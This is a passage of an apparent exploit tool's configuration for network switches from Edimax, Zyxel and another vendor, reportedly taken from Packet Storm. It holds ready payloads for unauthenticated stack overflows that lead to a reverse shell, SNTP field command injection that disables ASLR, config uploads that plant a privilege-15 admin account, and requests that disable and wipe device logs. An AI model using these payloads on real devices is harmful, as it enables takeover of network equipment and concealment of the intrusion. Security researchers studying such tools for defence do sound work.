    'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
    'authenticated': False,
    'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
    'vulnerable': True,
    'safe': True # Boa/Hydra restart/watchdog, False = no restart, True = restart
    },
    'priv15_account': {
    'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
    'authenticated': False,
    'json':True,
    'encryption':'md5',
    'content':'Content-Type\n\nconfig-file-header\nusername "USERNAME" secret encrypted PASSWORD\n\n------',
    'add_uri':'/cgi/httpuploadruncfg.cgi',
    'del_query':'{"_ds=1&user=USERNAME&_de=1":{}}',
    'del_uri':'/cgi/set.cgi?cmd=aaa_userDel',
    'vulnerable': False,
    'safe': True
    },
    'sntp': {
    #
    # Most probably it is vulnerable
    #
    'description':'SNTP command injection (PoC: disable ASLR)',
    'json':True,
    'authenticated': True,
    'enable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
    'enable_query':'{"_ds=1&sntpStatus=1&_de=1":{}}',
    'status_uri':'/cgi/get.cgi?cmd=sys_timeSettings',
    'inject_uri':'/cgi/set.cgi?cmd=sys_timeSntp',
    'inject_query':'{"_ds=1&srvDef=byIp&sntpServer=`echo 0 > /proc/sys/kernel/randomize_va_space`&cursntpPort=123&_de=1":{}}',
    'check_query':'{"_ds=1&srvDef=byIp&sntpServer=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&cursntpPort=123&_de=1":{}}',
    'delete_uri':'/cgi/set.cgi?cmd=sys_timeSntpDel',
    'delete_query':'{"":{}}',
    'disable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
    'disable_query':'{"_ds=1&sntpStatus=0&_de=1":{}}',
    'verify_uri':'/tmp/check',
    'vulnerable': False,
    'safe': True
    },
    #
    # The stack overflow in 'username' and 'password' at same request are multipurpose.
    #
    
    #
    # The trick to jump and execute:
    # 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
    # 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
    # 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
    # 4. We will also feed required function parameters, by adding them to '_CMD_'
    #
    'stack_cgi_diag': {# Not vulnerable
    'vulnerable': False,
    },
    'stack_cgi_log': {
    'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
    'authenticated': False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
    
    'log_settings_set_cmd':'',# Disable Logging CMD
    'log_settings_set_SIGSEGV':True,# Disable Logging SIGSEGV ?
    
    'log_ramClear_cmd':'',# Clean RAM CMD
    'log_ramClear_SIGSEGV':True,# Clean RAM SIGSEGV ?
    
    'log_fileClear_cmd':'',# Clean FILE log CMD
    'log_fileClear_SIGSEGV':True,# Clean FILE log SIGSEGV ?
    # /sqfs/home/web/cgi/set.cgi; cgi_log_settings_set()
    'log_settings_set':0x00,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_ramClear_set()
    'log_ramClear':0x00,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_fileClear_set()
    'log_fileClear':0x00,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    
    'workaround':False,# My LAB workaround
    'verify_uri':'',
    'vulnerable': False,
    'safe': True
    },
    'stack_cgi_sntp': {
    'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
    'authenticated': False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
    'sys_timeSntp_set_cmd':'&srvDef=byIp&sntpServer=`echo 0 > /proc/sys/kernel/randomize_va_space`&cursntpPort=123',
    'sys_timeSntp_set_check':'&sntpServer=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&cursntpPort=123',
    
    'sys_timeSntpDel_set_cmd':'&sntpServer=+&cursntpPort=139',# CMD
    
    'sys_timeSettings_set_cmd_enable':'&sntpStatus=1',# Enable CMD
    'sys_timeSettings_set_cmd_disable':'&sntpStatus=0',# Disable CMD
    'sys_timeSettings_set_SIGSEGV': True,# SIGSEGV ?
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntp_set()
    'sys_timeSntp_set':0x00,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntpDel_set()
    'sys_timeSntpDel_set':0x00,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSettings_set()
    'sys_timeSettings_set':0x00,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    
    'workaround':False,# My LAB workaround
    'verify_uri':'/tmp/check',
    'vulnerable': False,
    'safe': True
    },
    #
    # After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
    # Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
    #
    'heack_cgi_shell': {
    'description':'Stack overflow in "username/password" (PoC: reverse shell)',
    'authenticated': False,
    'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'logout_uri':'/cgi/set.cgi?cmd=home_logout',
    'query':'{"_ds=1&username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&_de=1":{}}',
    'stack':True, # False = use Heap, and there are no ASLR
    
    'cgi':'set.cgi',# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
    'START':0x00,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x00,# end: You may want to play with this if you dont get it working
    'usr_nop': 64,# NOP sled (shellcode will be tailed)
    'pwd_nop': 77,# filler/garbage (not used for something constructive)
    'align': 3,# Align opcodes in memory
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    
    'workaround':False,# My LAB workaround
    'vulnerable': False,
    'safe': True
    },
    
    },
    },
    
    'Edimax': {
    'vendor': 'EDIMAX Technology Co., Ltd.',
    'modulus_uri':'/cgi/get.cgi?cmd=home_login',
    'info_leak':False,
    'info_leak_JSON':True,
    'info_leak_uri':'/cgi/get.cgi?cmd=home_login',
    'xsid':False,
    'xsid_uri':'/cgi/get.cgi?cmd=home_main',
    'login': {
    'description':'Login/Logout on remote device',
    'authenticated': True,
    'json':True,
    'encryption':'rsa',
    'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'query':'{"_ds=1&username=USERNAME&password=PASSWORD&_de=1":{}}',
    'status_uri':'/cgi/get.cgi?cmd=home_loginStatus',
    'logout_uri':'/cgi/set.cgi?cmd=home_logout',
    'vulnerable': True,
    'safe': True
    },
    'log':{
    'description':'Disable and clean logs',
    'authenticated': True,
    'json':True,
    'disable_uri':'/cgi/set.cgi?cmd=log_global',
    'disable_query':'{"_ds=1&empty=1&_de=1":{}}',
    'status':'/cgi/get.cgi?cmd=log_global',
    'clean_logfile_uri':'/cgi/set.cgi?cmd=log_clear',
    'clean_logfile_query':'{"_ds=1&target=1&_de=1":{}}',
    'clean_logmem_uri':'/cgi/set.cgi?cmd=log_clear',
    'clean_logmem_query':'{"_ds=1&target=0&_de=1":{}}',
    'vulnerable': True,
    'safe': True
    },
    # Verify lacking authentication
    'verify': {
    'httpuploadruncfg.cgi':{
    'authenticated': False,
    'response':'file',
    'Content-Type':True,
    'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi/httpuploadruncfg.cgi',
    'check_uri':'/tmp/http_saverun_cfg',
    'content':'/var/config/running-config',
    'content_check':'/var/config/running-config',
    'vulnerable': True,
    'safe': True
    },
    'httprestorecfg.cgi':{
    'authenticated': False,
    'response':'file',
    'Content-Type':True,
    'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi/httprestorecfg.cgi',
    'check_uri':'/tmp/startup-config',
    'content':'/mnt/startup-config',
    'content_check':'/mnt/startup-config',
    'vulnerable': True,
    'safe': True
    },
    'httpupload.cgi':{
    'authenticated': False,
    'response':'file',
    'Content-Type':True,
    'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
    'uri':'/cgi-bin/httpupload.cgi',
    'check_uri':'/tmp/http_uploadfail',
    'content':'Copy: Illegal software format', # Not the real content, its the result of invalid firmware (workaround)
    'content_check':'Copy: Illegal software format',
    'vulnerable': True,
    'safe': True
    },
    'login.cgi': {
    'description':'Stack overflow in login.cgi (PoC: create file /tmp/VUL.TXT)',
    'authenticated': False,
    'response':'file',
    'Content-Type':False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'check_uri':'/tmp/VUL.TXT', # We cannot control the content...
    'content':'{"_ds=1&username='+ self.random_string(40) +'&password='+ '/' * 23 +'/tmp/VUL.TXT&_de=1":{}}',
    'content_check':'1',
    'vulnerable': True,
    'safe': True
    },
    'set.cgi': { # 'username' also suffer from stack overflow
    'description':'Stack overflow in "username/password" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username=admin&password=' + self.random_string(312) + '&_de=1":{}}',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    },
    'exploit': {
    'heack_hydra_shell': {
    'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
    'authenticated': False,
    'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
    'vulnerable': True,
    'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
    },
    'priv15_account': {
    'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
    'authenticated': False,
    'json':True,
    'encryption':'clear',
    'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" password PASSWORD\n\n------',
    #'encryption':'nopassword',
    #'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" nopassword\n\n------', # Yep, working too
    'add_uri':'/cgi/httpuploadruncfg.cgi',
    'del_query':'{"_ds=1&user=USERNAME&_de=1":{}}',
    'del_uri':'/cgi/set.cgi?cmd=sys_acctDel',
    'vulnerable': True,
    'safe': True
    },
    'sntp': {
    'description':'SNTP command injection (PoC: disable ASLR)',
    'json':True,
    'authenticated': True,
    'enable_uri':'/cgi/set.cgi?cmd=sys_time',
    'enable_query':'{"_ds=1&sntp=1&_de=1":{}}',
    'status_uri':'/cgi/get.cgi?cmd=sys_time',
    'inject_uri':'/cgi/set.cgi?cmd=sys_time',
    'inject_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139&_de=1":{}}',
    'check_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139&_de=1":{}}',
    'delete_uri':'/cgi/set.cgi?cmd=sys_time',
    'delete_query':'{"_ds=1&sntp=1&timezone=0&srvDef=ipv4&srvHost=+&port=139&dlsType=0&_de=1":{}}',
    'disable_uri':'/cgi/set.cgi?cmd=sys_time',
    'disable_query':'{"_ds=1&sntp=0&_de=1":{}}',
    'verify_uri':'/tmp/check',
    'vulnerable': True,
    'safe': True
    },
    #
    # The stack overflow in 'username' and 'password' at same request are multipurpose.
    #
    
    #
    # The trick to jump and execute:
    # 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
    # 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
    # 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
    # 4. We will also feed required function parameters, by adding them to '_CMD_'
    #
    'stack_cgi_diag': {
    'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
    'authenticated': False,
    
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
    'sys_ping_post_SIGSEGV': True,# SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    
    },
    'stack_cgi_log': {
    'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
    'authenticated': False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
    
    #'log_settings_set_cmd':'&logState=1&consoleState=1&ramState=1&fileState=1',# Enable Logging CMD
    'log_settings_set_cmd':'&empty=1',# Disable Logging CMD
    'log_settings_set_SIGSEGV':True,# Disable Logging SIGSEGV ?
    
    'log_ramClear_cmd':'&target=0',# Clean RAM CMD
    'log_ramClear_SIGSEGV':True,# Clean RAM SIGSEGV ?
    
    'log_fileClear_cmd':'&target=1',# Clean FILE log CMD
    'log_fileClear_SIGSEGV':True,# Clean FILE log SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'verify_uri':'',
    'vulnerable': True,
    'safe': True
    },
    'stack_cgi_sntp': {
    'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
    'authenticated': False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
    'sys_timeSntp_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139&dlsType=0',
    'sys_timeSntp_set_check':'&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139&dlsType=0',
    
    'sys_timeSntpDel_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=+&port=139&dlsType=0',# CMD
    
    'sys_timeSettings_set_cmd_enable':'&sntp=1',# Enable CMD
    'sys_timeSettings_set_cmd_disable':'&sntp=0',# Disable CMD
    'sys_timeSettings_set_SIGSEGV': True,# SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'verify_uri':'/tmp/check',
    'vulnerable': True,
    'safe': True
    },
    #
    # After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
    # Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
    #
    'heack_cgi_shell': {
    'description':'Stack overflow in "username/password" (PoC: reverse shell)',
    'authenticated': False,
    'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'logout_uri':'/cgi/set.cgi?cmd=home_logout',
    'query':'{"_ds=1&username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&_de=1":{}}',
    'stack':True, # False = use Heap, and there are no ASLR
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    },
    
    },
    },
    
    'Zyxel': {
    'vendor': 'Zyxel Communications Corp.',
    'modulus_uri':'',
    'info_leak':False,
    'info_leak_JSON':False,
    'info_leak_uri':'',
    'xsid':False,
    'xsid_uri':'',
    'login': {
    'description':'Login/Logout on remote device',
    'authenticated': True,
    'json':False,
    'encryption':'encode',
    'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
    'query':'username=USERNAME&password=PASSWORD&login=1',
    'status_uri':'/cgi-bin/dispatcher.cgi?cmd=547',
    'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
    'vulnerable': False,
    'safe': True
    },
    'log':{
    'description':'Disable and clean logs',
    'authenticated': True,
    'json':False,
    'disable_uri':'/cgi-bin/dispatcher.cgi',
    'disable_query':'LOGGING_SERVICE=0&cmd=4353',
    'status':'/cgi-bin/dispatcher.cgi?cmd=4352',
    'clean_logfile_uri':'/cgi-bin/dispatcher.cgi',
    'clean_logfile_query':'cmd_4364=Clear+file+messages',
    'clean_logmem_uri':'/cgi-bin/dispatcher.cgi',
    'clean_logmem_query':'cmd_4364=Clear+buffered+messages',
    'vulnerable': True,
    'safe': True
    },
    # Verify lacking authentication
    'verify': {
    'dispatcher.cgi': { # 'username' also suffer from heap overflow
```
{: .nolineno }

<br>

  

>*Source* :   [https://packetstormsecurity.com](https://packetstormsecurity.com)